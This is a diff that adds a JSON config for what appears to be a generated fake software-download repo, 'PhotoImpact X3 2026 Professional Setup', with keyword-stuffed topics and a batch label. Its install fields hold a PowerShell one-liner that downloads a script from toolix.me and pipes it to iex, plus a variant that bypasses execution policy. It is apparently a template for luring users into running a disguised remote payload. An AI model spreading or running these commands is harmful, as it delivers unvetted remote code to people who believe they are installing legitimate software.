@@ -1,0 +1,28 @@
+{
+  "repo": "PhotoImpact-X3-2026-Professional-Setup",
+  "product": "PhotoImpact X3 2026 Professional Setup",
+  "product_title": "PhotoImpact X3 2026 Professional",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "creative",
+  "topics": [
+    "how-to-install-photoimpact-x3",
+    "photoimpact-x3-app",
+    "visual-design",
+    "design-software",
+    "image-editing",
+    "creative-workflow",
+    "photoimpact-x3-creative-tool",
+    "photoimpact-x3-design-tool",
+    "photoimpact-x3",
+    "photoimpact-x3-desktop-2026",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
